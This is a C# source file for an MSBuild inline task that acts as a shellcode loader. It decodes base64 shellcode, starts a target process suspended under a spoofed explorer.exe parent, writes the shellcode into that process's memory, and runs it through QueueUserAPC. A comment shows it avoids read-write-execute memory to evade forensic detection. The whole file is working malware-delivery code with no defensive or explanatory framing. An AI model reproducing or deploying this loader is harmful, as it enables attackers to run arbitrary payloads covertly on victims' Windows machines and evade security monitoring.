using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

namespace MyTasks
{
    public class SimpleTask : Task
    {
        public override bool Execute()
        {
            
            
            ApcInjectionNewProcess.Exec(this.MyCode,this.MyProcess);
            
            return true;
        }
        public string MyProperty { get; set; }
        public string MyCode { get; set; }
        public string MyProcess { get; set; }
        
    }
}
public class ApcInjectionNewProcess
{
    public static void Exec(string a, string b)
    {   
        byte[] shellcode = System.Convert.FromBase64String(a);
        
        
        
        // Target process to inject into
        string processpath = b;
        STARTUPINFOEX si = new STARTUPINFOEX();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        
        si.StartupInfo.cb = (uint)Marshal.SizeOf(si);

        var lpValue = Marshal.AllocHGlobal(IntPtr.Size);


        var processSecurity = new SECURITY_ATTRIBUTES();
        var threadSecurity = new SECURITY_ATTRIBUTES();
        processSecurity.nLength = Marshal.SizeOf(processSecurity);
        threadSecurity.nLength = Marshal.SizeOf(threadSecurity);

        var lpSize = IntPtr.Zero;
        InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
        si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, ref lpSize);

        Marshal.WriteIntPtr(lpValue, IntPtr.Zero);
        UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            (IntPtr)ProcThreadAttribute.MITIGATION_POLICY,
            lpValue,
            (IntPtr)IntPtr.Size,
            IntPtr.Zero,
            IntPtr.Zero
            );
        var parentHandle = Process.GetProcessesByName("explorer")[0].Handle;
        lpValue = Marshal.AllocHGlobal(IntPtr.Size);
        Marshal.WriteIntPtr(lpValue, parentHandle);

        UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            (IntPtr)ProcThreadAttribute.PARENT_PROCESS,
            lpValue,
            (IntPtr)IntPtr.Size,
            IntPtr.Zero,
            IntPtr.Zero
            );

        // Create new process in suspended state to inject into
        bool success = CreateProcess(processpath, null, 
            ref processSecurity, ref threadSecurity,
            false, 
            ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT | ProcessCreationFlags.CREATE_SUSPENDED, 
            IntPtr.Zero, null, ref si, out pi);
        
        // Allocate memory within process and write shellcode
        IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_READWRITE);
        IntPtr bytesWritten = IntPtr.Zero;
        bool resultBool = WriteProcessMemory(pi.hProcess,resultPtr,shellcode,shellcode.Length, out bytesWritten);
        
        // Open thread
        IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
        uint oldProtect = 0;
        
        // Modify memory permissions on allocated shellcode
        resultBool = VirtualProtectEx(pi.hProcess,resultPtr, shellcode.Length,PAGE_EXECUTE_READ, out oldProtect);
        
        // Assign address of shellcode to the target thread apc queue
        IntPtr ptr = QueueUserAPC(resultPtr,sht,IntPtr.Zero);
        
        IntPtr ThreadHandle = pi.hThread;
        ResumeThread(ThreadHandle);
        
    }
    
    
    private static UInt32 MEM_COMMIT = 0x1000;
 
    //private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; //I'm not using this #DFIR  ;-)
    private static UInt32 PAGE_READWRITE = 0x04;
    private static UInt32 PAGE_EXECUTE_READ = 0x20;
    
    
    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }
    
    [Flags]
    public enum ProcessCreationFlags : uint
    {
        ZERO_FLAG = 0x00000000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NEW_CONSOLE = 0x00000010,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_NO_WINDOW = 0x08000000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_SEPARATE_WOW_VDM = 0x00001000,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_SUSPENDED = 0x00000004,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        DEBUG_PROCESS = 0x00000001,
        DETACHED_PROCESS = 0x00000008,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        INHERIT_PARENT_AFFINITY = 0x00010000
    }
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    [Flags]
    public enum    ThreadAccess : int
    {
        TERMINATE           = (0x0001)  ,
        SUSPEND_RESUME      = (0x0002)  ,
        GET_CONTEXT         = (0x0008)  ,
        SET_CONTEXT         = (0x0010)  ,
        SET_INFORMATION     = (0x0020)  ,
        QUERY_INFORMATION       = (0x0040)  ,
        SET_THREAD_TOKEN    = (0x0080)  ,
        IMPERSONATE         = (0x0100)  ,
        DIRECT_IMPERSONATION    = (0x0200)
    }
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
        int dwThreadId);
    
    [DllImport("kernel32.dll",SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out IntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
    
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
         Int32 size, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32.dll", SetLastError = true )]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
    Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
     ProcessAccessFlags processAccess,
     bool bInheritHandle,
     int processId
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll")]
    public static extern uint SuspendThread(IntPtr hThread);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
    int dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum ProcThreadAttribute : int
        {
            MITIGATION_POLICY = 0x20007,
            PARENT_PROCESS = 0x00020000
        }

        [Flags]
        public enum BinarySignaturePolicy : ulong
        {
            BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000,
            BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x300000000000
        }
}